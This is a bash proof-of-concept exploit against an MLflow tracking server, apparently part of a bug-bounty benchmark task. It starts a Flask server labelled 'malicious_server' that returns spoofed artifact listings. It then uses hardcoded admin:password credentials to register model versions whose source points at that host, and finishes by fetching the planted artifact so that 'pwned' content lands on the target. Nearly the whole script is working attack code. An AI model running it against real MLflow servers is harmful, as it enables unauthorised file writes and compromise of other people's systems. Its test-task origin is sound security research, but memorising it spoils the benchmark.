#!/bin/bash
IS_CI_RUN=$1
if [ "$IS_CI_RUN" == "true" ]; then
  BASE_URL="http://mlflow:5002"
else
  BASE_URL="http://127.0.0.1:5002"
fi

#!/bin/bash

# Exit immediately if a command exits with a non-zero status.
set -e


# --- Dependency Installation ---
echo ">>> Checking/Installing Flask dependency..."
if python3 -m pip --version > /dev/null 2>&1; then
    python3 -m pip install --user Flask 
fi

# Get current container IP
CONTAINER_IP=$(hostname -I | awk '{print $1}')
if [ -z "$CONTAINER_IP" ]; then
  echo "Error: Could not determine container IP address using 'hostname -I'."
  # Fallback attempt (might work if eth0 is the primary interface)
  CONTAINER_IP=$(ip addr show eth0 | grep "inet\s" | awk '{print $2}' | cut -d/ -f1)
  if [ -z "$CONTAINER_IP" ]; then
    echo "Error: Fallback attempt using 'ip addr show eth0' also failed."
    echo "Exiting."
    exit 1
  else
    echo ">>> Using IP from 'ip addr show eth0': $CONTAINER_IP"
  fi
else
   echo ">>> Determined Container IP using 'hostname -I': $CONTAINER_IP"
fi

# --- Configuration ---
PYTHON_SCRIPT_NAME="app.py"
FLASK_PORT=4444
FLASK_HOST=$CONTAINER_IP

# --- Create Flask App File ---
echo ">>> Creating Flask application file (${PYTHON_SCRIPT_NAME})..."
cat << EOF > ${PYTHON_SCRIPT_NAME}
from flask import Flask, jsonify
import sys

app = Flask(__name__)
# Disable Flask/Werkzeug default logging to keep script output cleaner
# You can enable debugging or add proper logging if needed.
# app.config["DEBUG"] = True
content = "pwned - mlflow"

print(f" * Flask server starting on http://{FLASK_HOST}:{FLASK_PORT}/", file=sys.stderr)

@app.errorhandler(404)
def page_not_found(e):
    return content, 404 # Return status code explicitly

@app.route("/api/2.0/mlflow-artifacts/artifacts")
def index():
    return jsonify({
        "files": [
            {
                "path": "/tmp/mlflow/bounty0",
                "is_dir": False,
                "file_size": len(content)
            }
        ]
    })

if __name__ == '__main__':
    # Use 'sys.argv' if you want to pass host/port from bash,
    # otherwise hardcode like below.
    app.run(host="${FLASK_HOST}", port=${FLASK_PORT})

EOF
echo ">>> ${PYTHON_SCRIPT_NAME} created."

# --- Start Flask Server in Background ---
echo ">>> Starting Flask server in the background..."
# Start Python script, redirect stdout/stderr to files (optional but good for logs)
# Or use /dev/null to discard output: > /dev/null 2>&1
python3 ${PYTHON_SCRIPT_NAME} > flask_server.log 2>&1 &

# Capture the PID of the last background process
FLASK_PID=$!
echo ">>> Flask server started with PID: ${FLASK_PID}"

sleep 3

# Set MLflow authentication credentials
export MLFLOW_TRACKING_USERNAME=admin
export MLFLOW_TRACKING_PASSWORD=password

AUTH_HEADER="Authorization: Basic $(echo -n "admin:password" | base64)"

echo $BASE_URL/ajax-api/2.0/mlflow/registered-models/create

curl -X POST -H 'Content-Type: application/json' -H "$AUTH_HEADER" -d '{"name": "poc"}' "$BASE_URL/ajax-api/2.0/mlflow/registered-models/create"
curl -X POST -H 'Content-Type: application/json' -H "$AUTH_HEADER" -d '{"name": "poc", "source": "http://malicious_server:4444/api/2.0/mlflow-artifacts/artifacts/"}' "$BASE_URL/ajax-api/2.0/mlflow/model-versions/create"
curl -X POST -H 'Content-Type: application/json' -H "$AUTH_HEADER" -d '{"name": "poc", "source": "models:/poc/1"}' "$BASE_URL/ajax-api/2.0/mlflow/model-versions/create"
curl -H "$AUTH_HEADER" "$BASE_URL/model-versions/get-artifact?path=random&name=poc&version=2"